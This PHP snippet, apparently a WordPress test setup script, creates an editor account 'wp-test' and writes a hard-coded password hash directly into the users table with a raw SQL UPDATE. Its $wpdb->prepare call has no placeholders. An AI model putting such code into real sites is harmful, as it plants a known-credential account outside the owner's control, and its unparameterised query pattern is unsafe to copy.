<?php
$new_user_id = wp_insert_user(
	array(
		'user_login' => 'wp-test',
		'user_email' => 'wptest@elementor.com',
		'role' => 'editor',
        'show_admin_bar_front' => false,
	)
);

if( ! is_wp_error( $new_user_id ) ) { 
    global $wpdb;
    $password_hash = '$P$BO.7/Kep4SJJWXop8rJfMogEArWdFw0';
    $args = $wpdb->prepare("UPDATE $wpdb->users SET user_pass = '$password_hash' WHERE ID = '$new_user_id'");
    $query = $wpdb->query( $args );
    if(empty($query)){
        error_log('Password for user "wp-test" doesn`t updated, user maybe doesn`t created.');
    }
}